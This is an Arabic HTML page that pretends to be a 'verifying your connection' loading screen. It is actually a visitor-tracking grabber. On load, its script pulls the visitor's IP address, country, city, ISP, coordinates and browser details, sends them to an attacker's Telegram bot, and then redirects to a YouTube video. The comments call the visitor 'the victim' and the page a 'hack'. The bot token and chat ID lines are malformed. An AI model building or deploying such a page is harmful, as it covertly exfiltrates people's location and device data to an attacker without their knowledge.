<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحقق...</title>
    <style>
        body {
            background: #0d1117;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            color: #c9d1d9;
        }
        .loader {
            text-align: center;
        }
        .spinner {
            border: 4px solid #30363d;
            border-top: 4px solid #58a6ff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>جاري التحقق من اتصالك... سيتم تحويلك فوراً.</p>
    </div>

    <script>
        // ======== بيانات البوت (استبدلها ببياناتك) ========
        const BOT_TOKEN =tg://openmessage?user_id=8717959254 "";     //::ABC-DEF1234
        const CHAT_ID =1497190595 "";    //
        // =================================================

        // الوجهة النهائية (رابط اليوتيوب المطلوب)
        const REDIRECT_URL = "https://www.youtube.com/watch?v=6N5IQxrac6g";

        // دالة لجلب الموقع الجغرافي + الـ IP
        function getGeoData() {
            fetch('https://ip-api.com/json/')
                .then(response => response.json())
                .then(data => {
                    // تجهيز الرسالة التفصيلية
                    const msg = 
                        `🔥 *اختراق جديد - قنبلة موقوتة* 🔥\n` +
                        `———————————————\n` +
                        `🌐 *الـ IP:* ${data.query || "غير معروف"}\n` +
                        `📍 *الدولة:* ${data.country || "غير معروف"}\n` +
                        `🏙️ *المدينة:* ${data.city || "غير معروف"}\n` +
                        `📡 *المزود:* ${data.isp || "غير معروف"}\n` +
                        `🗺️ *الموقع:* ${data.lat || "?"}, ${data.lon || "?"}\n` +
                        `———————————————\n` +
                        `💻 *الجهاز:* ${navigator.userAgent || "غير معروف"}\n` +
                        `🕒 *الوقت:* ${new Date().toLocaleString()}\n` +
                        `🔗 *الرابط المستخدم:* ${window.location.href}`;

                    // إرسال الرسالة إلى تيليجرام
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: msg,
                            parse_mode: 'Markdown'
                        })
                    }).catch(() => {
                        // محاولة بديلة في حال فشل الإرسال (بدون Markdown)
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: CHAT_ID,
                                text: `زائر جديد: ${data.query} | ${data.country}`
                            })
                        });
                    });

                    // بعد إرسال البيانات، نوجه الضحية إلى يوتيوب بعد 1.5 ثانية
                    setTimeout(() => {
                        window.location.replace(REDIRECT_URL);
                    }, 1500);
                })
                .catch(() => {
                    // في حال فشل جلب الموقع، نرسل بيانات محدودة ونوجه
                    const fallbackMsg = 
                        `⚠️ *زائر جديد (بدون موقع)* ⚠️\n` +
                        `💻 الجهاز: ${navigator.userAgent}\n` +
                        `🕒 الوقت: ${new Date().toLocaleString()}`;

                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: fallbackMsg,
                            parse_mode: 'Markdown'
                        })
                    });

                    setTimeout(() => {
                        window.location.replace(REDIRECT_URL);
                    }, 1500);
                });
        }

        // تشغيل الوظيفة فور تحميل الصفحة
        getGeoData();
    </script>
</body>
</html>
